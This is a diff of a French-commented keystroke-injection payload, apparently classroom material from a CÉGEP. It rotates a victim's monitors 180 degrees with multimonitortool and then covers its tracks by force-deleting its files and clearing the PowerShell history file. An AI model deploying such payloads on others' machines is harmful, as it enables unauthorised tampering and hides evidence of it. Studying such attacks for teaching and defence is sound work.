@@ -8,7 +8,7 @@ REM # inverser l'orientation des 2 premiers moniteurs           #
 REM # puis efface ses traces.                                   #
 REM #                                                           #
 REM # Auteur       : Vincent Carrier, CÉGEP Édouard-Montpetit   #
-REM # Version      : 2.0                                        #
+REM # Version      : 2.1                                        #
 REM #                                                           #
 REM #############################################################
 
@@ -29,11 +29,11 @@ REM Extraction du programme
 ALTSTRING expand-archive a.zip;
 
 REM Exécution de l'attaque
-ALTSTRING 1..4|%{.\a\multimonitortool.exe /setorientation $_ 180};
+ALTSTRING 1..4|%{saps .\a\multimonitortool.exe "/setorientation $_ 180" -wait};
 
 REM Nettoyage
 ALTSTRING remove-item a.zip,.\a -recurse -force;
-ALTSTRING clear (get-psreadlineoption).historysavepath;
+ALTSTRING clc (get-psreadlineoption).historysavepath;
 ALTSTRING exit
 
 REM Exécution du script
